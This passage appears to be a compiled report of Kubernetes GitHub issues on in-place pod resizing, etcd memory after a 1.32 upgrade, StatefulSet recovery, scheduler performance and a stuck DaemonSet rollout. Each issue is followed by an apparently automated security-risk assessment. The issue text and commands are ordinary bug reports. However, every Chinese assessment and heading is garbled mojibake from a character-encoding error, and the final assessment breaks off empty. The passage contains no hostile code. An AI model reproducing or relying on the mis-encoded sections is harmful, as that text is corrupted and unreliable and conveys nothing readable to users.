Nov 12 10:15:55 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:55.067746   12114 status_manager.go:883] "Status for pod updated successfully" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" statusVersion=6 status={"phase":"Running","conditions":[{"type":"KruisePodReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"InPlaceUpdateReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"}],"hostIP":"172.21.154.57","hostIPs":[{"ip":"172.21.154.57"}],"podIP":"172.21.154.96","podIPs":[{"ip":"172.21.154.96"}],"startTime":"2024-11-12T02:15:50Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2024-11-12T02:15:50Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine","imageID":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128","containerID":"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb","started":true,"allocatedResources":{"cpu":"100m","memory":"100Mi"},"resources":{"limits":{"cpu":"800m","memory":"800Mi"},"requests":{"cpu":"100m","memory":"100Mi"}}}],"qosClass":"Burstable"}
```

#### How can we reproduce it (as minimally and precisely as possible)?

I am unable to identify a consistent method to reproduce this issue.
This is an intermittent case.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å¯ç”¨InPlacePodVerticalScalingçš„é›†ç¾¤ä¸­ï¼Œkubeletæœ‰æ—¶ä¼šé”™è¯¯åœ°è®¾ç½®`.status.resize`å­—æ®µï¼Œå¯¼è‡´Podçš„çŠ¶æ€å‡ºç°å¼‚å¸¸ã€‚è¿™ç§ç°è±¡åœ¨å‡å°‘CPUè¯·æ±‚é‡æ—¶å‘ç”Ÿï¼Œå…·ä½“è¡¨ç°ä¸º`.status.resize`å­—æ®µåœ¨ä¸åº”å‡ºç°çš„æƒ…å†µä¸‹è¢«è®¾ç½®ä¸º`InProgress`ï¼Œå¹¶ä¸”`.status.containerStatuses[x].resources`çš„å€¼åå¤å˜åŒ–ã€‚

æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸€ä¸ªå¶å‘çš„bugï¼Œå¯¼è‡´Podçš„çŠ¶æ€æ›´æ–°ä¸æ­£ç¡®ã€‚ä½†ä»å½“å‰çš„æè¿°æ¥çœ‹ï¼Œè¿™æ›´åƒæ˜¯kubeletåœ¨å¤„ç†Podå‚ç›´æ‰©ç¼©å®¹è¿‡ç¨‹ä¸­çš„é€»è¾‘é”™è¯¯æˆ–çŠ¶æ€åŒæ­¥é—®é¢˜ï¼Œå¹¶æœªæ¶‰åŠå®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šä»æè¿°æ¥çœ‹ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥é—®é¢˜è¿›è¡Œæ”»å‡»ï¼Œå¯¼è‡´æƒé™æå‡ã€æ•°æ®æ³„éœ²ã€è¿œç¨‹ä»£ç æ‰§è¡Œç­‰å®‰å…¨é—®é¢˜ã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šæ­¤é—®é¢˜å±äºåŠŸèƒ½æ€§ç¼ºé™·ï¼Œå¯èƒ½ä¼šå½±å“ç³»ç»Ÿçš„å¯é æ€§æˆ–å¯ç”¨æ€§ï¼Œä½†ä¸å¤ªå¯èƒ½è¢«è®¤å®šä¸ºå®‰å…¨æ¼æ´ï¼Œå› æ­¤ä¸å¤ªå¯èƒ½è¢«åˆ†é…CVEç¼–å·ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---

## Issue #128986 Dueling writes to extension-apiserver-authentication configmap during 1.31 â†’ 1.32.0-rc.1 upgrade

- Issue é“¾æ¥ï¼š[#128986](https://github.com/kubernetes/kubernetes/issues/128986)

### Issue å†…å®¹

#### What happened?

We had an alert firing for high memory usage for 1.32. At the time of increase we changed the churn to create at v1.31 (So update to v1.32). Previously it was creating at v1.30 and updating to v1.31

We can see some etcd are using more memory than others
```
kubx-etcd-02          etcd-csprq8020q6fal7635s0-6zxcz72w5v                         24m          420Mi           
kubx-etcd-02          etcd-csprq8020q6fal7635s0-hm5px7dkc5                         19m          416Mi           
kubx-etcd-02          etcd-csprq8020q6fal7635s0-jhmsq75wc5                         60m          566Mi  

...

kubx-etcd-04          etcd-cssndj620tea3foqjl5g-5qqscgqp2g                         28m          101Mi           
kubx-etcd-04          etcd-cssndj620tea3foqjl5g-c45kz2lprz                         23m          117Mi           
kubx-etcd-04          etcd-cssndj620tea3foqjl5g-wsbwcb9fp8                         50m          103Mi 
```

#### What did you expect to happen?

When a cluster updating to 1.32 from 1.31, we expected (roughly) th same etcd memory usage as 1.31

#### How can we reproduce it (as minimally and precisely as possible)?

- Deploy a 1.31 cluster
- upgrade to 1.32
- Observer memory usage on etcd

#### Anything else we need to know?

A cluster that was created at v1.32 has an etcd `container_memory_working_set_bytes` of around 130 MB.
A v1.31 cluster is also around 130 MB. After the upgrade to v1.32 it increased to around 450 MB (Caused by a short increase in etcd_mvcc_db_total_size_in_use_in_bytes to 430 MB). `etcd_mvcc_db_total_size_in_bytes` permanently increased to 450 MB at upgrade time too. Over time some of the etcds saw an increase in `container_memory_working_set_bytes` to 600MB, but `etcd_mvcc_db_total_size_in_bytes` did not change.

When it was defragged the `etcd_mvcc_db_total_size_in_bytes` dropped to 11 MB (Which is just above the value of `etcd_mvcc_db_total_size_in_use_in_bytes` but `container_memory_working_set_bytes` only dropped to around 450MB.

After further investigation it requires a defrag, followed by restart of etcd pods to return the memory usage to normal after an update to v1.32.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.32.0-beta.0+IKS
```

</details>


#### Cloud provider

<details>
IBM Cloud
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.1 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo

$ uname -a
Linux test-csug3jq20lvmbeb4nq2g-standard132-default-00000172 6.8.0-48-generic #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œè¯¥é—®é¢˜æè¿°çš„æ˜¯åœ¨Kubernetesä»v1.31å‡çº§åˆ°v1.32æ—¶ï¼Œetcdçš„å†…å­˜ä½¿ç”¨é‡æ˜¾è‘—å¢åŠ ï¼Œéœ€è¦é€šè¿‡defragï¼ˆç¢ç‰‡æ•´ç†ï¼‰å’Œé‡å¯etcd podæ¥æ¢å¤æ­£å¸¸å†…å­˜ä½¿ç”¨ã€‚è¿™ä¼¼ä¹æ˜¯å‡çº§è¿‡ç¨‹ä¸­å¯¼è‡´etcdæ•°æ®å¢å¤§ï¼Œäº§ç”Ÿç¢ç‰‡ï¼Œä»è€Œå¼•èµ·å†…å­˜å ç”¨å¢åŠ çš„æ€§èƒ½é—®é¢˜ã€‚

åœ¨Issueä¸­ï¼Œæ²¡æœ‰æåŠä»»ä½•æ”»å‡»è€…å¯ä»¥åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠæƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œæˆ–å¯¹å…¶ä»–ç”¨æˆ·çš„å½±å“ç­‰å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜å±äºæ€§èƒ½ä¼˜åŒ–æˆ–å‡çº§è¿‡ç¨‹ä¸­çš„é—®é¢˜ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128977 [InPlacePodVerticalScaling]stuck in InProgress when patch resources in a special pod

- Issue é“¾æ¥ï¼š[#128977](https://github.com/kubernetes/kubernetes/issues/128977)

### Issue å†…å®¹

#### What happened?

In clusters with InPlacePodVerticalScaling enabled, if a pod without resource limits undergoes a resource patch change, its status will perpetually remain 'InProgress'. The kubelet log contains an error message: 'E1125 17:05:47.633962 12114 kuberuntime_manager.go:750] "podResources.CPUQuota or podResources.CPUShares is nil" pod="clone3-h6r9k"'.

#### What did you expect to happen?

I hope this case can be closed-loop, and it can be achieved in any of the following ways:

1. Rejected by the api-server.
2. The proposal is rejected by Kubelet and displayed in `.status.resize`.
3. Able to be properly resized.

#### How can we reproduce it (as minimally and precisely as possible)?

```yaml pod.yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    owner: clone
  name: clone-test
spec:
  containers:
  - env:
    - name: test
      value: foo
    image: registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine
    imagePullPolicy: IfNotPresent
    name: nginx
    resizePolicy:
    - resourceName: cpu
      restartPolicy: NotRequired
    - resourceName: memory
      restartPolicy: NotRequired
    resources:
      limits:
        memory: 1Gi
      requests:
        cpu: 100m
        memory: 100Mi
  dnsPolicy: ClusterFirst
  terminationGracePeriodSeconds: 30
```
1. create pod
```bash
kubectl apply -f pod.yaml
```
2. wait pod ready
3. patch pod

```bash
kubectl patch po clone-test --type='json' -p='[{"op": "replace", "path": "/spec/containers/0/resources/requests/cpu", "value": "200m"}]'
```


4. You will encounter an error log like `podResources.CPUQuota or podResources.CPUShares is nil` in the Kubelet logs, and as a result, the pod will remain stuck in the 'InProgress' state.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å¯ç”¨äº†InPlacePodVerticalScalingçš„é›†ç¾¤ä¸­ï¼Œå¦‚æœä¸€ä¸ªæ²¡æœ‰è®¾ç½®èµ„æºé™åˆ¶ï¼ˆlimitsï¼‰çš„Podè¿›è¡Œèµ„æºä¿®æ”¹ï¼ˆpatchï¼‰æ“ä½œï¼Œå…¶çŠ¶æ€ä¼šä¸€ç›´å¡åœ¨â€œInProgressâ€çŠ¶æ€ï¼Œä¸”Kubeletæ—¥å¿—ä¸­ä¼šå‡ºç°é”™è¯¯ä¿¡æ¯ã€‚è¿™ä¸ªé—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·æˆ–Bugï¼Œå¯¼è‡´Podæ— æ³•æ­£ç¡®å®Œæˆèµ„æºè°ƒæ•´ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤ç¼ºé™·è¿›è¡Œæ”»å‡»æˆ–è·å–æ›´é«˜æƒé™ï¼Œä¹Ÿæ— æ³•å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå› ä¸ºéœ€è¦æœ‰æƒé™å¯¹Podè¿›è¡Œèµ„æºä¿®æ”¹æ“ä½œæ‰ä¼šè§¦å‘è¯¥é—®é¢˜ã€‚è€Œè¿™ç§æƒé™é€šå¸¸ä»…é™äºæœ‰åˆæ³•è®¿é—®æƒé™çš„ç”¨æˆ·ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128970 statefulset can not recreate the lost replicas in case of node loss

- Issue é“¾æ¥ï¼š[#128970](https://github.com/kubernetes/kubernetes/issues/128970)

### Issue å†…å®¹

#### What happened?

kube-state-metric  was deployed with statefulset, in multiple shard  mode

shard 1-3 are lost during a disaster, but they never get recreated
![image](https://github.com/user-attachments/assets/55974f88-54b3-46f5-a42f-fa14889f422a)


#### What did you expect to happen?

the lost replicas should be recreated automatically

#### How can we reproduce it (as minimally and precisely as possible)?

create a kind cluster with multiple nodes
create a statefulset with replicas spread over these nodes
delete one or more nodes and check

#### Anything else we need to know?
I'am not sure if it's designed by purpose or a known issue waiting for fix

#### Kubernetes version

happened on 1.20.7
assumed it still exists in lastest release

#### Cloud provider

not specific to  any cloud provider

#### OS version

not specific to any OS version

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨èŠ‚ç‚¹ä¸¢å¤±çš„æƒ…å†µä¸‹ï¼ŒStatefulSetæ— æ³•é‡æ–°åˆ›å»ºä¸¢å¤±çš„å‰¯æœ¬çš„é—®é¢˜ã€‚è¿™å±äºStatefulSetåœ¨ç¾éš¾æ¢å¤æƒ…å†µä¸‹çš„è¡Œä¸ºå¼‚å¸¸ï¼Œå¯èƒ½å½±å“åº”ç”¨çš„é«˜å¯ç”¨æ€§å’Œå¯é æ€§ã€‚ç„¶è€Œï¼ŒæŒ‰ç…§é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¿™ä¸ªé—®é¢˜å¹¶ä¸å­˜åœ¨è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ï¼Œä¹Ÿä¸å±äºå¯èƒ½è¢«åˆ†é…CVEç¼–å·çš„æ¼æ´ã€‚å®ƒä¸æ¶‰åŠæ”»å‡»è€…çš„æ¶æ„è¡Œä¸ºï¼Œä¹Ÿä¸æ¶‰åŠæƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128949 scheduler plugin podTopologySpread performs not well enough in a disaster recovery scenario

- Issue é“¾æ¥ï¼š[#128949](https://github.com/kubernetes/kubernetes/issues/128949)

### Issue å†…å®¹

#### What happened?

I ran a disaster recovery scenario with 2000 kwok fake nodes, 100,000 pending pods recently.

Each pod has topologySpreadConstraints specified as below
`
                "topologySpreadConstraints": [
                    {
                        "labelSelector": {
                            "matchLabels": {
                                "app": "fake-pod"
                            }
                        },
                        "maxSkew": 1,
                        "topologyKey": "topology.kubernetes.io/region", 
                        "whenUnsatisfiable": "ScheduleAnyway"
                    },
                    {
                        "labelSelector": {
                            "matchLabels": {
                                "app": "fake-pod"
                            }
                        },
                        "maxSkew": 1,
                        "topologyKey": "kubernetes.io/hostname",
                        "whenUnsatisfiable": "ScheduleAnyway"
                    }
                ]
`

The overall performance of kube-scheduler degrades as the number of pods on each node increases.
![scheduler_attempts](https://github.com/user-attachments/assets/236aa4f0-2534-40af-8780-a40bd5f5a377)

As I digged further with pprof ,  the most time-consuming process was found in podTopologySpead, within the PreScore stage, in below 2 functions:
- countPodsMatchSelector  
- PodMatchesNodeSelectorAndAffinityTerms
![scheduler_pprof](https://github.com/user-attachments/assets/00d57008-172c-4469-b39e-bc3e4983144a)



 


#### What did you expect to happen?

rate(scheduler_schedule_attempts_total[1m]) should keep steady during the test run

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a cluster with 2000 nodes, stop kube-scheduler first
2. Create a deployment with 100,000 replicas,  topologySpreadConstraints described as above
3. Start kube-scheduler and watch the deployment status and kube-scheduler metrics, until all pods are scheduled

#### Anything else we need to know?

countPodsMatchSelector is also called in Score stage. It can be a good starting point to boost overall performance.

In most scenarios, pod has an owner (rs/dp/ds/sts etc),  and topologySpread is applied to all pods with the same owner.

So based on the above theory, this can be optimized to an O(1) procedure, after we apply some tricks on it:

- add a cache (map[UID][]*PodInfo) in nodeInfo, indexed by the pod's owner Id
- the cache will be updated with the Add/Update/Del callback of pod informer
- in countPodsMatchSelector
   * If the pod has an owner, we use owner's Id to find the pre-aggregated count.
   * If it doesn't, fallback to the old ways.

Any comments are welcomed. 

If this is feasible without defects, I can try to create a PR for this. 

The improvement can be (in a same test baseline):
- 100,000 pod scheduled total time:  drops from 7min30s to 4min
- rate(scheduler_schedule_attempts_total[1m]) keeps steady above 420 compared to an avg of 220
![image](https://github.com/user-attachments/assets/3eaf43d5-6bc8-47d5-8603-dab22dc65689)




#### Kubernetes version

1.20.7 but also applies to the lastest release

#### Cloud provider

not specific to any cloud provider

#### OS version

not specific to any os version

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°çš„æ˜¯åœ¨ç¾éš¾æ¢å¤åœºæ™¯ä¸­ï¼Œä½¿ç”¨podTopologySpreadè°ƒåº¦æ’ä»¶æ—¶ï¼Œæ€§èƒ½ä¸å¤Ÿç†æƒ³çš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“æœ‰å¤§é‡ï¼ˆ100,000ä¸ªï¼‰å¾…è°ƒåº¦çš„Podæ—¶ï¼Œkube-schedulerçš„æ•´ä½“æ€§èƒ½ä¸‹é™ï¼Œä¸»è¦è€—æ—¶é›†ä¸­åœ¨PreScoreé˜¶æ®µçš„`countPodsMatchSelector`å’Œ`PodMatchesNodeSelectorAndAffinityTerms`å‡½æ•°ã€‚Issueæäº¤è€…æå‡ºäº†ä¸€ç§ä¼˜åŒ–æ–¹æ¡ˆï¼Œå³é€šè¿‡åœ¨nodeInfoä¸­æ·»åŠ ä¸€ä¸ªä»¥Podæ‰€å±çš„æ§åˆ¶å™¨ï¼ˆå¦‚ReplicaSetã€Deploymentç­‰ï¼‰ä¸ºé”®çš„ç¼“å­˜æ¥æå‡æ€§èƒ½ã€‚

ç»è¿‡åˆ†æï¼Œæ­¤Issueæ¶‰åŠçš„æ˜¯è°ƒåº¦å™¨æ€§èƒ½ä¼˜åŒ–é—®é¢˜ï¼Œå¹¶æœªæåŠä»»ä½•å®‰å…¨æ¼æ´æˆ–æ½œåœ¨å®‰å…¨é£é™©ã€‚ä¼˜åŒ–è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„ç¼“å­˜æœºåˆ¶ï¼Œå¦‚æœè®¾è®¡å’Œå®ç°å¾—å½“ï¼Œä¸ä¼šå¼•å…¥å®‰å…¨é—®é¢˜ã€‚æ²¡æœ‰è¿¹è±¡è¡¨æ˜è¯¥ä¼˜åŒ–æ–¹æ¡ˆä¼šå¯¼è‡´æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€æ•°æ®æ³„éœ²ç­‰å®‰å…¨é£é™©ã€‚

å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128917 [FG:InPlacePodVerticalScaling] Remove ResizePolicy defaulting

- Issue é“¾æ¥ï¼š[#128917](https://github.com/kubernetes/kubernetes/issues/128917)

### Issue å†…å®¹

/kind bug

Prior to Kubernetes v1.31, any defaulted change to the pod API could trigger running pods to restart on apiserver upgrade (fixed by https://github.com/kubernetes/kubernetes/pull/124220). Since v1.30 is still within the valid version we cannot set a default ResizePolicy.

Kubelet already handles an unset ResizePolicy as an implicit default (`NotRequired`), so all that is needed here is to remove the defaulting logic. This is probably the preferred behavior even without the version skew issue.

/sig node
/milestone v1.33
/priority important-soon
/triage accepted

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥ Issue å†…å®¹æ¶‰åŠ Kubernetes é¡¹ç›®ä¸­å…³äº `ResizePolicy` é»˜è®¤å€¼å¤„ç†çš„ä¸€ä¸ª Bug ä¿®å¤ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ Kubernetes v1.31 ä¹‹å‰ï¼Œå¦‚æœå¯¹ Pod API è¿›è¡Œäº†ä»»ä½•é»˜è®¤å€¼çš„æ›´æ”¹ï¼Œå¯èƒ½ä¼šåœ¨ apiserver å‡çº§æ—¶è§¦å‘æ­£åœ¨è¿è¡Œçš„ Pod é‡å¯ï¼ˆè¿™ä¸ªé—®é¢˜å·²åœ¨ PR https://github.com/kubernetes/kubernetes/pull/124220 ä¸­ä¿®å¤ï¼‰ã€‚ç”±äº v1.30 ç‰ˆæœ¬ä»åœ¨ä½¿ç”¨ä¸­ï¼Œå› æ­¤å»ºè®®ä¸è¦ä¸º `ResizePolicy` è®¾ç½®é»˜è®¤å€¼ï¼Œè€Œæ˜¯è®© kubelet å¤„ç†æœªè®¾ç½®çš„ `ResizePolicy`ï¼Œå°†å…¶è§†ä¸ºé»˜è®¤å€¼ `NotRequired`ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªé—®é¢˜ä¸é›†ç¾¤å‡çº§è¿‡ç¨‹ä¸­çš„è¡Œä¸ºæœ‰å…³ï¼Œå¯èƒ½å¯¼è‡´ Pod é‡å¯ã€‚ç„¶è€Œï¼Œè¿™éœ€è¦é›†ç¾¤ç®¡ç†å‘˜åœ¨å‡çº§ apiserver æ—¶è§¦å‘ï¼Œæ™®é€šæ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤è¡Œä¸ºæ¥å®æ–½æ”»å‡»ï¼Œä¹Ÿä¸å­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´è¿›è¡Œæœªæˆæƒæ“ä½œã€æƒé™æå‡ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²ç­‰å®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1. è¯¥é£é™©ä¸èƒ½è¢«æ™®é€šæ”»å‡»è€…åˆ©ç”¨ã€‚
2. è¯¥é£é™©ä¸å¯èƒ½æˆä¸ºä¸€ä¸ªé«˜å±æ¼æ´ï¼Œä¸ä¼šè¢«åˆ†é… CVE ç¼–å·ï¼ŒæŒ‰ç…§ CVSS 3.1 æ ‡å‡†è¯„åˆ†ä¸åœ¨ High ä»¥ä¸Šã€‚
4. å³ä½¿è®¤ä¸ºæ˜¯æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰é£é™©ï¼Œæ”»å‡»è€…ä¹Ÿéœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½å®æ–½ï¼ŒæŒ‰ç…§æ ‡å‡†åº”é™ä½é£é™©è¯„çº§ã€‚

å› æ­¤ï¼Œæ­¤ Issue ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128908 daemonset rolling update stuck

- Issue é“¾æ¥ï¼š[#128908](https://github.com/kubernetes/kubernetes/issues/128908)

### Issue å†…å®¹

#### What happened?

![image](https://github.com/user-attachments/assets/025f7c96-c30f-4db3-b461-873dda86f680)
![image](https://github.com/user-attachments/assets/b6782f9c-62de-4c1c-816f-3459e7eef1ca)

I found that daemonset was stuck during the rolling upgrade, and one pod was not updated.
Or the numberUnavailable calculation result of daemonset is incorrect.

In addition, when deleting abnormal pods, daemonset does not delete all pods at a time. Instead, it deletes one pod every several minutes. The log is as follows:
I1121 13:08:27.938981      10 daemon_controller.go:849] "Found failed daemon pod on node, will try to kill it" pod="nce-omp/hofsfusedeviceplugin-d9p2d" node="caasnode1"
I1121 13:08:27.939171      10 controller_utils.go:609] "Deleting pod" controller="hofsfusedeviceplugin" pod="nce-omp/hofsfusedeviceplugin-d9p2d"
I1121 13:08:27.939480      10 event.go:307] "Event occurred" object="nce-omp/hofsfusedeviceplugin" fieldPath="" kind="DaemonSet" apiVersion="apps/v1" type="Warning" reason="FailedDaemonPod" message="Found failed daemon pod nce-omp/hofsfusedeviceplugin-d9p2d on node caasnode1, will try to kill it"
I1121 13:08:27.953742      10 event.go:307] "Event occurred" object="nce-omp/hofsfusedeviceplugin" fieldPath="" kind="DaemonSet" apiVersion="apps/v1" type="Normal" reason="SuccessfulDelete" message="Deleted pod: hofsfusedeviceplugin-d9p2d"
I1121 13:23:27.940867      10 daemon_controller.go:849] "Found failed daemon pod on node, will try to kill it" pod="nce-omp/hofsfusedeviceplugin-85zzt" node="caasnode1"
I1121 13:23:27.941014      10 controller_utils.go:609] "Deleting pod" controller="hofsfusedeviceplugin" pod="nce-omp/hofsfusedeviceplugin-85zzt"
I1121 13:23:27.941335      10 event.go:307] "Event occurred" object="nce-omp/hofsfusedeviceplugin" fieldPath="" kind="DaemonSet" apiVersion="apps/v1" type="Warning" reason="FailedDaemonPod" message="Found failed daemon pod nce-omp/hofsfusedeviceplugin-85zzt on node caasnode1, will try to kill it"
I1121 13:23:27.953140      10 event.go:307] "Event occurred" object="nce-omp/hofsfusedeviceplugin" fieldPath="" kind="DaemonSet" apiVersion="apps/v1" type="Normal" reason="SuccessfulDelete" message="Deleted pod: hofsfusedeviceplugin-85zzt"

#### What did you expect to happen?

The daemonset should roll the upgrade correctly.

#### How can we reproduce it (as minimally and precisely as possible)?

N/A

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.30
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
